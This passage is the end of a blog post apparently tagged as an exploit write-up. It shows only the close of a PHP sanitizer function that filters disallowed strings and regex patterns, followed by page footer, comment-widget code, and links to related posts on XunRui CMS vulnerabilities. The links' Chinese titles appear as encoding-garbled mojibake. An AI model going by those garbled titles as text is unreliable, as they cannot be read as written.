</span></span><span class="line"><span class="cl">		<span class="nv">$str</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nx">array_keys</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_never_allowed_str</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_never_allowed_str</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_never_allowed_regex</span> <span class="k">as</span> <span class="nv">$regex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$str</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;#&#39;</span><span class="o">.</span><span class="nv">$regex</span><span class="o">.</span><span class="s1">&#39;#is&#39;</span><span class="p">,</span> <span class="s1">&#39;_\\0&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$str</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_never_call_str</span><span class="p">,</span> <span class="nx">array_keys</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_never_call_str</span><span class="p">),</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/expliot-db/">Expliot-Db</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
        
        
            <div class="article-image">
                <img src="/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db.d6d0f23494fcfe00d4fac72faebda90f_hud9700ca58d822386b8178068bd5ae476_8790_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ËøÖÁùøCMS v4.5.0Âà∞v4.5.1ÂâçÂè∞‰ª£Á†ÅÊ≥®ÂÖ•ÊºèÊ¥û"
                        
                        data-hash="md5-1tDyNJT8/gDU&#43;scvrr2pDw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ËøÖÁùøCMS v4.5.0Âà∞v4.5.1ÂâçÂè∞‰ª£Á†ÅÊ≥®ÂÖ•ÊºèÊ¥û</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
        
        
            <div class="article-image">
                <img src="/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/expliot-db.d6d0f23494fcfe00d4fac72faebda90f_hud9700ca58d822386b8178068bd5ae476_8790_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ËøÖÁùøCMS v4.5.4Âà∞v4.5.6(ÁõÆÂâçÊúÄÊñ∞Áâà)Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û"
                        
                        data-hash="md5-1tDyNJT8/gDU&#43;scvrr2pDw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ËøÖÁùøCMS v4.5.4Âà∞v4.5.6(ÁõÆÂâçÊúÄÊñ∞Áâà)Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
        
        
            <div class="article-image">
                <img src="/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/expliot-db.d6d0f23494fcfe00d4fac72faebda90f_hud9700ca58d822386b8178068bd5ae476_8790_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ËøÖÁùøCMS v4.3.3Âà∞v4.5.1ÂêéÂè∞‰ªªÊÑè‰ª£Á†ÅÊ≥®ÂÖ•ÊºèÊ¥û(Êñá‰ª∂ÂÜôÂÖ•Âä†Êñá‰ª∂ÂåÖÂê´)"
                        
                        data-hash="md5-1tDyNJT8/gDU&#43;scvrr2pDw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ËøÖÁùøCMS v4.3.3Âà∞v4.5.1ÂêéÂè∞‰ªªÊÑè‰ª£Á†ÅÊ≥®ÂÖ•ÊºèÊ¥û(Êñá‰ª∂ÂÜôÂÖ•Âä†Êñá‰ª∂ÂåÖÂê´)</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="//cdn.jsdelivr.net/npm/twikoo@1.6.38/dist/twikoo.all.min.js"></script>
<div id="tcomment"></div>
<style>
    .twikoo {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
    :root[data-scheme="dark"] {
        --twikoo-body-text-color-main: rgba(255, 255, 255, 0.9);
        --twikoo-body-text-color: rgba(255, 255, 255, 0.7);
    }
    .twikoo .el-input-group__prepend,
    .twikoo .tk-action-icon,
    .twikoo .tk-submit-action-icon,
    .twikoo .tk-time,
    .twikoo .tk-comments-no,
    .twikoo .tk-comments-count {
        color: var(--twikoo-body-text-color);
    }
    .twikoo .el-input__inner,
    .twikoo .el-textarea__inner,
    .twikoo .tk-preview-container,
    .twikoo .tk-content,
    .twikoo .tk-nick,
    .twikoo .tk-send {
        color: var(--twikoo-body-text-color-main);
    }
    .twikoo .el-button{
        color: var(--twikoo-body-text-color)!important;
    }
    .twikoo .el-input__count {
        color: var(--twikoo-body-text-color) !important;
    }
    .OwO .OwO-body {
        background-color: var(--body-background) !important;
        color: var(--body-text-color) !important;
    }
</style><script>
    twikoo.init({
        envId: 'https:\/\/twikoo-lgd1k3x92-vercel00.vercel.app\/',
        el: '#tcomment',lang: 'zh-CN',})
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2022 - 
        
        2025 Weltolk
    </section>
    
    <section class="powerby">
        
            2u94 4 4un <br/>
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
